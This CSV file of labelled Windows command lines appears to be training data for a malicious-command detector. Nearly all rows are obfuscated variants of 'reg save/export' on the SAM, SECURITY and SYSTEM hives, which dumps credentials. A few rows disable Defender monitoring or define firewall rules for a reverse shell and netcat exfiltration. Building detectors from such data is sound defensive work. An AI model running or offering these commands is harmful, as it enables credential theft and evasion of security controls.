text,label
"cmd.exe /c ""reg save hklm\sam c:\temp\ofotctbq.dat""",1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\5jt65ejr.save""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\wjqbqc7n.dat""""",1
reg export hklm\security c:\windows\temp\yi3lrobz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ppp2nlgh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\tpshc8au.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\q5kfyjpt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\qx7wpecp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9jt2noc9.dat""",1
reg export hklm\security c:\windows\temp\cc5ipiq0.save,1
reg save hklm\security c:\windows\temp\zeig5l5e.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2pb7yosf.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\9t25pccn.save""",1
reg save hklm\sam c:\windows\temp\vref0yhw.save,1
reg   export   hklm\system   c:\windows\temp\117bkoxk.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\gwwp459n.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yv123rut.dat""",1
reg save hklm\system c:\windows\temp\o7k5bcpx.save,1
reg save hklm\system c:\windows\temp\09n6qs3v.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\zru3pe7d.dat""",1
reg save hklm\security c:\windows\temp\i61qnxuw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\0vylciq2.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\2lmq2r3o.dat""",1
reg save hklm\security c:\windows\temp\xgvoo3ns.save,1
reg export hklm\security c:\windows\temp\czsvqs6i.save,1
reg   save   hklm\sam   c:\windows\temp\sqf9f4hl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\1a9e8gti.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\3v0qxrub.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\11rb89dv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\yyccogyi.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\gjf667oj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u2sw78c4.dat""",1
reg export hklm\sam c:\windows\temp\78chgtdt.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\3odvtd22.dat""",1
reg export hklm\sam c:\windows\temp\4yd34w5j.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\6cfzncnj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wg2r53cs.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\f8idxnqb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jlmoaf5s.dat""",1
reg save hklm\security c:\windows\temp\ebchzbn3.save,1
reg save hklm\system c:\windows\temp\rpsf0qhz.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\anwq059c.dat""",1
reg export hklm\system c:\windows\temp\5acjx2zs.save,1
reg save hklm\security c:\windows\temp\jrg8a13o.save,1
reg save hklm\security c:\windows\temp\9dpydsxo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ojzoasxk.dat""",1
reg save hklm\sam c:\windows\temp\9x74of5a.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\ju6ae5sa.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\po74ag58.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ls16q3hz.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\spm09hhh.dat""""",1
reg save hklm\sam c:\windows\temp\f29l2i57.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fglwj3vd.dat""",1
reg save hklm\system c:\windows\temp\8px2hb3q.save,1
reg export hklm\system c:\windows\temp\fdbbicng.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\if722psj.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1kg9g2wy.dat""",1
reg export hklm\sam c:\windows\temp\quucy5ax.save,1
reg export hklm\sam c:\windows\temp\n7078dmy.save,1
reg save hklm\security c:\windows\temp\k1plmwtv.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8ikw0z7c.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\veh60f8n.dat""""",1
reg save hklm\sam c:\windows\temp\y6uu3gt3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9sizmtgi.dat""",1
reg   export   hklm\sam   c:\windows\temp\s3jzbiq1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\av3notld.dat""",1
reg export hklm\sam c:\windows\temp\qgn7y2t2.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\cqk5jpp1.save""",1
reg export hklm\system c:\windows\temp\07571cnj.save,1
reg save hklm\security c:\windows\temp\lv55vdo7.save,1
reg save hklm\security c:\windows\temp\b5xx85kg.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cvu1rl48.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s2cucfp4.dat""",1
reg save hklm\system c:\windows\temp\e4qqobcb.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\mqfxblqt.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\cldwe1y2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ss09arma.dat""",1
reg save hklm\system c:\windows\temp\10a251fb.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\edh1r7gj.save""",1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\hqn5hg7o.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8lziydjb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jbgfv7a1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\blzn4x99.dat""",1
reg save hklm\security c:\windows\temp\xr0vv48k.save,1
reg   save   hklm\sam   c:\windows\temp\73ttd7bl.save,1
reg save hklm\sam c:\windows\temp\i0jyh8ip.save,1
reg save hklm\security c:\windows\temp\5usbjw8n.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\6mankwxf.dat""",1
reg export hklm\system c:\windows\temp\jvt4u0my.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3f6dhr24.dat""",1
reg save hklm\sam c:\windows\temp\0b11r5qo.save,1
reg save hklm\security c:\windows\temp\k0zzd2mg.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\jb5v1vo6.save""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\5c1s18nm.dat""""",1
reg export hklm\security c:\windows\temp\cf3r416i.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ls9fu73p.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\e973bfa1.dat""",1
reg save hklm\sam c:\windows\temp\j1se3sbd.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\7cr9phr4.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ehplnoqu.dat""",1
reg export hklm\sam c:\windows\temp\snwu9wge.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ydu5283o.dat""",1
reg export hklm\security c:\windows\temp\w3epwcy4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\9gbnd3nb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\id228hos.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hiyreyun.dat""",1
reg export hklm\security c:\windows\temp\07ntyt76.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4wfz5ikm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rr4n09i2.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\gepkb15l.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\loyqcckd.dat""",1
reg  save  hklm\security  c:\windows\temp\hmf1iyfs.save,1
reg export hklm\system c:\windows\temp\35mqx2oz.save,1
reg  export  hklm\security  c:\windows\temp\d86zu2b9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\smarrrpo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\73r5u6b6.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2bp3x64b.dat""",1
reg save hklm\security c:\windows\temp\bvioza2l.save,1
reg save hklm\system c:\windows\temp\9py28msf.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\g9p0bxlh.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hbc3cmp1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\irb3q652.dat""",1
reg export hklm\sam c:\windows\temp\4a5pp4tn.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\h7sg4yfr.dat""""",1
reg export hklm\security c:\windows\temp\kaigykwf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\y4mu2xct.dat""",1
reg export hklm\system c:\windows\temp\97n8jql3.save,1
reg save hklm\security c:\windows\temp\nhd1q8jy.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\xmhei1ys.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\fwl3zr8l.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\t249vl7l.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\z0f9dkaw.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\kpfnmr5j.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0h8ab14u.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xrxt8ufz.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\y9wufbmd.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\yushlm7u.dat""""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\0cvv3fc3.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\35bum9vf.dat""",1
reg save hklm\security c:\windows\temp\jtj9meu5.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rjelf58m.dat""",1
reg export hklm\system c:\windows\temp\h90tyz9c.save,1
reg export hklm\system c:\windows\temp\oqesavf7.save,1
reg save hklm\system c:\windows\temp\2mv215of.save,1
reg export hklm\security c:\windows\temp\6kyxr3n2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\mrbchyjv.dat""",1
reg  save  hklm\security  c:\windows\temp\d0xrva5z.save,1
reg export hklm\sam c:\windows\temp\cu1bg7f1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\v1wiaazq.dat""",1
reg export hklm\sam c:\windows\temp\sibgqwk7.save,1
reg   export   hklm\system   c:\windows\temp\isb87b29.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zt3h48x7.dat""",1
reg export hklm\system c:\windows\temp\z4sqzkrc.save,1
reg export hklm\system c:\windows\temp\wtyfx133.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\nvqao1oh.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\ur8y8q08.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5e1o52i9.dat""",1
reg export hklm\security c:\windows\temp\6n94w5fi.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\498aujb5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\axznd1ko.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\ujxcn9rj.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iw0dwr65.dat""",1
reg export hklm\security c:\windows\temp\jtfp32vj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2wrhmwr1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6ctk61s1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ior90tgw.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\vb5wt70z.dat""",1
reg save hklm\system c:\windows\temp\5x16nnax.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\od51k2cf.dat""",1
reg export hklm\sam c:\windows\temp\8fui2jp0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qlm0dkwk.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qkck29rf.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b8lnk3wv.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\04drtmdl.save""",1
reg export hklm\system c:\windows\temp\bosmtgsi.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\jm1rjnon.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\aukadvum.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\thmopncu.dat""",1
reg export hklm\security c:\windows\temp\kbphvupq.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\htx63sh8.dat""",1
reg save hklm\security c:\windows\temp\61oxk92l.save,1
reg export hklm\system c:\windows\temp\lveuhy2r.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\14f3y70k.dat""",1
reg export hklm\sam c:\windows\temp\s97qmr7g.save,1
reg save hklm\security c:\windows\temp\d7v1ecy5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\xidz2hh7.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\6t0sdvch.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\sdw6a0z0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\lsos2t0a.dat""",1
reg export hklm\system c:\windows\temp\klivnru5.save,1
reg export hklm\sam c:\windows\temp\87udnxur.save,1
reg save hklm\security c:\windows\temp\niapnptb.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\b3qwk6lt.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\q0c1ljzi.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\519oeh7e.dat""",1
reg save hklm\system c:\windows\temp\kbgnxaup.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\sd51xydp.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\sv9yyeci.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\fg8gm4io.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i34872he.dat""",1
$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken'),3
reg export hklm\system c:\windows\temp\l3qkpk14.save,1
reg export hklm\security c:\windows\temp\ms0pkzmj.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mkd2vzpj.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\236q1v1o.dat""",1
reg save hklm\system c:\windows\temp\kz2f23ie.save,1
reg  export  hklm\security  c:\windows\temp\hcmj8g6r.save,1
"cmd.exe /c ""set-mppreference -disablerealtimemonitoring $true""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\e8ytgr33.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3b7pgk5c.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\h5a2loor.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\70sxicah.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\lk53wr2i.dat""",1
reg  save  hklm\security  c:\windows\temp\zk7h41bo.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ix3q2a29.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\gxxqw4sq.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\dtqcwx4t.dat""",1
reg save hklm\security c:\windows\temp\lf0povox.save,1
reg save hklm\system c:\windows\temp\vd8y6c93.save,1
reg   export   hklm\sam   c:\windows\temp\n4hrrpiz.save,1
"cmd.exe /c ""netsh   dump   >   netconfig.txt""",0
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\0riv51nu.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qdfpfch1.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y5cyj4e4.dat""",1
reg save hklm\system c:\windows\temp\28kitvhy.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\oi1fvfdo.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ucsf56a1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jw9znwk0.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\5dqz2aif.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xf3hjzsu.dat""",1
reg export hklm\sam c:\windows\temp\6ztwzv6n.save,1
reg  save  hklm\sam  c:\windows\temp\hy4nvqgt.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\vp60ipb0.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qqv7w8g6.dat""",1
reg export hklm\system c:\windows\temp\dhnhrote.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u2vgrf86.dat""",1
reg export hklm\system c:\windows\temp\sl355tdi.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\zfk08nt4.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rfxbgpn8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hx93sdoj.dat""",1
reg  save  hklm\sam  c:\windows\temp\53otigk5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\rn24k54e.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\owkvkqi8.dat""",1
reg save hklm\sam c:\windows\temp\firwjr8w.save,1
reg  save  hklm\sam  c:\windows\temp\o42ksp0s.save,1
reg export hklm\sam c:\windows\temp\t9owpxa7.save,1
reg  save  hklm\sam  c:\windows\temp\xzhnlajs.save,1
reg save hklm\system c:\windows\temp\4byblave.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\i7mxlfbv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\aqqzbhb5.dat""",1
reg export hklm\system c:\windows\temp\p8gr7eur.save,1
reg save hklm\security c:\windows\temp\as003fi3.save,1
reg  save  hklm\sam  c:\windows\temp\cs91aaf2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bw32zaod.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mgz4eutj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yiqpbn0y.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jtyenh5c.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\heaku030.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fsowaohs.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\i7zxorlx.dat""",1
reg save hklm\sam c:\windows\temp\bbv6b7pr.save,1
reg export hklm\system c:\windows\temp\n74ju7hy.save,1
reg export hklm\security c:\windows\temp\zb23beiv.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\p3rhluxi.dat""",1
reg export hklm\security c:\windows\temp\dacyqto0.save,1
reg export hklm\system c:\windows\temp\vs0ibeet.save,1
reg export hklm\system c:\windows\temp\si3mfl1u.save,1
reg save hklm\sam c:\windows\temp\j2awgydp.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\z4vdpxey.dat""""",1
reg export hklm\sam c:\windows\temp\i67qv60f.save,1
reg save hklm\system c:\windows\temp\as1l1a8t.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\iue3achb.dat""""",1
reg save hklm\security c:\windows\temp\24ugop80.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\qcdo2fir.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\ui5pk5p3.save""",1
reg export hklm\security c:\windows\temp\ejz69ytx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\m71y9qhg.dat""",1
reg export hklm\system c:\windows\temp\hxvftj7u.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\lsjnm4yl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\iwaxnjok.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\cfbniybn.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\drzmqlz3.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\g88jhwic.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\sur0jgsl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\j7532yny.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\v2uc2rpz.dat""",1
reg export hklm\sam c:\windows\temp\31hq4jd0.save,1
reg save hklm\system c:\windows\temp\ds3tm1i3.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\fjbtyz0l.save""",1
reg export hklm\security c:\windows\temp\hd80p5ib.save,1
reg save hklm\system c:\windows\temp\cd2c4yr9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\5rbxzlip.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\47htywji.dat""",1
reg   export   hklm\system   c:\windows\temp\uybc9qvp.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\zcigctp7.dat""",1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\rs7bbwfm.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\mv1qpk0x.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\go1125un.dat""",1
reg save hklm\security c:\windows\temp\3rkq8a6s.save,1
reg save hklm\system c:\windows\temp\fqe2irpe.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rm9iiwwe.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\4cg91r3n.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yzyl9j2h.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\t2duv3x6.dat""",1
reg export hklm\system c:\windows\temp\8tf149zy.save,1
reg export hklm\system c:\windows\temp\8w8g6i5q.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\xz3knu9r.save""",1
reg save hklm\sam c:\windows\temp\m0aq4w0j.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\2zjfy0v2.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\d97gxz7y.dat""",1
reg save hklm\security c:\windows\temp\7uszw20u.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\a39j35gv.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\8pu3b5tw.save,1
reg export hklm\system c:\windows\temp\3ma8me6n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\x4cezr0x.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wne86g6k.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\azvcqb72.dat""""",1
reg save hklm\security c:\windows\temp\mf4no2kb.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fd9s0to0.dat""",1
reg export hklm\system c:\windows\temp\56meqv6t.save,1
reg save hklm\system c:\windows\temp\qtwz9rfq.save,1
reg  export  hklm\system  c:\windows\temp\hvo0285f.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\cpndbg2i.dat""",1
reg  save  hklm\security  c:\windows\temp\9x1udi1j.save,1
reg save hklm\security c:\windows\temp\argyqjvj.save,1
reg export hklm\security c:\windows\temp\ft0g9mvc.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\ygowghw9.save""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\l5g1qn3f.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\r5kxzo4s.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\620st2l7.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\27shwtcs.dat""",1
reg save hklm\sam c:\windows\temp\76u8kccb.save,1
reg save hklm\sam c:\windows\temp\mi5qmyke.save,1
reg save hklm\sam c:\windows\temp\htetbbgh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1kmduaz5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ef5198n3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\865kq2t8.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\n060aq1r.save""",1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\pz5ru6b8.dat""",1
reg save hklm\sam c:\windows\temp\t7uznn23.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\t9jtpq5i.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i7maloyt.dat""",1
reg export hklm\system c:\windows\temp\sauotucx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rid3gog4.dat""",1
reg save hklm\sam c:\windows\temp\fmjatodz.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\a840v7ma.dat""",1
reg export hklm\system c:\windows\temp\3gfi53n8.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\baqfizuj.dat""",1
reg export hklm\security c:\windows\temp\78ztz80d.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\cm7y26ii.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\6ts9bmu9.dat""",1
reg save hklm\system c:\windows\temp\bfb09iw4.save,1
reg save hklm\security c:\windows\temp\lv5bgcy2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zor8gwy9.dat""",1
reg export hklm\system c:\windows\temp\563qfh0e.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\a31mj38z.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\5jdeelmk.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9nh6fssc.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\w9w589ro.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1hltwgxv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\k8lly57d.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\if57smll.dat""""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\dh5p4lzw.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\x34unhzo.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ozmzm78g.dat""",1
reg export hklm\sam c:\windows\temp\njingmf6.save,1
reg export hklm\security c:\windows\temp\y1vz8zul.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\dbf19vuv.dat""",1
reg export hklm\sam c:\windows\temp\6ga7v6v5.save,1
reg export hklm\security c:\windows\temp\cofz6gxn.save,1
reg save hklm\sam c:\windows\temp\8j1y2ra4.save,1
reg save hklm\security c:\windows\temp\roreorv0.save,1
reg export hklm\sam c:\windows\temp\v1gotgh4.save,1
reg save hklm\system c:\windows\temp\d3l3s3vw.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\fyl3i6cj.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\f9gl5g0d.dat""",1
reg export hklm\sam c:\windows\temp\et9eok8l.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\10vzpa6f.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4j7x492y.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jsdt3lvd.dat""",1
reg save hklm\security c:\windows\temp\81ns1myh.save,1
